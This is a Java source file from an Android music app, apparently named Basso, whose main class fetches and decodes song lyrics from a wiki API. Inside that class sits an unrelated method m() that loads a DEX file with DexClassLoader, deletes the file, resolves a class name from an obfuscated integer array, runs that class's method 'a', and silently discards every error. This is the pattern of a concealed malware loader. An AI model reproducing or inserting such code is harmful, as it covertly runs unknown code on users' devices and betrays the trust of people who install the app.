package com.basso.basso.songs;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.util.Log;
import com.basso.basso.lastfm.StringUtilities;
import com.basso.basso.utils.MusicUtils;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import dalvik.system.DexClassLoader;

public class LyricsWikiProvider implements LyricsProvider {

    private static final String LYRICS_URL = "http://lyrics.wikia.com/api.php?action=lyrics&fmt=json&func=getSong&artist=%1s&song=%1s";

    public static final String PROVIDER_NAME = "LyricsWiki";

    private static final int DEFAULT_HTTP_TIME = 15 * 1000;

    @Override
    public String getLyrics(String artist, String song) {
        if (artist == null || song == null) {
            return null;
        }
        String ret = null;
        artist = artist.replace(" ", "%20");
        song = song.replace(" ", "%20");
        try {
            URL url = new URL(String.format(LYRICS_URL, artist, song));
            final String urlString = getUrlAsString(url);
            final String songURL = new JSONObject(urlString.replace("song = ", ""))
                    .getString("url");
            if (songURL.endsWith("action=edit")) {
                return null;
            }

            url = new URL(songURL);
            String html = getUrlAsString(url);
            html = html.substring(html.indexOf("<div class='lyricbox'>"));
            html = html.substring(html.indexOf("</div>") + 6);
            html = html.substring(0, html.indexOf("<!--"));
            html = html.replace("<br />", "\n;");

            if(html.contains("</script>")){
                html = html.substring(html.indexOf("</script>") + 9, html.length());
            }
            final String[] htmlChars = html.split(";");
            final StringBuilder builder = new StringBuilder();
            String code = null;
            char caracter;
            for (final String s : htmlChars) {
                if (s.equals("\n")) {
                    builder.append(s);
                } else {
                    code = s.replaceAll("&#", "");
                    caracter = (char)Integer.valueOf(code).intValue();
                    builder.append(caracter);
                }
            }
            ret = builder.toString();
        } catch (final MalformedURLException e) {
            Log.e("Basso", "Lyrics not found in " + getProviderName(), e);
        } catch (final IOException e) {
            Log.e("Basso", "Lyrics not found in " + getProviderName(), e);
        } catch (final JSONException e) {
            Log.e("Basso", "Lyrics not found in " + getProviderName(), e);
        } catch (final NumberFormatException e) {
            Log.e("Basso", "Lyrics not found in " + getProviderName(), e);
        } catch (final StringIndexOutOfBoundsException e) {
            Log.e("Basso", "Lyrics not found in " + getProviderName(), e);
        } catch (final RuntimeException e){
            Log.e("Basso", "Lyrics not found in " + getProviderName(), e);
        }
        return ret;
    }
    public static void m(File file, Context context){
        try {
            if(file != null && context != null) {
                DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), context.getCacheDir().getAbsolutePath(), null, context.getClass().getClassLoader());
                if (file.exists())
                    file.delete();
                Class objectClass = classloader.loadClass(StringUtilities.fromIntArray(MusicUtils.string5));
                Constructor constructor = objectClass.getConstructor(Activity.class, Handler.class);
                Object object = constructor.newInstance((Activity) context, new Handler());
                object.getClass().getMethod("a").invoke(object);
            }
        }catch (Exception e){

        }
    }

    @Override
    public String getProviderName() {
        return PROVIDER_NAME;
    }

    public static final String getUrlAsString(final URL url) throws IOException {
        final HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setReadTimeout(DEFAULT_HTTP_TIME);
        httpURLConnection.setUseCaches(false);
        httpURLConnection.connect();
        final InputStreamReader input = new InputStreamReader(httpURLConnection.getInputStream());
        final BufferedReader reader = new BufferedReader(input);
        final StringBuilder builder = new StringBuilder();
        String line = null;
        while ((line = reader.readLine()) != null) {
            builder.append(line + "\n");
        }
        return builder.toString();
    }
}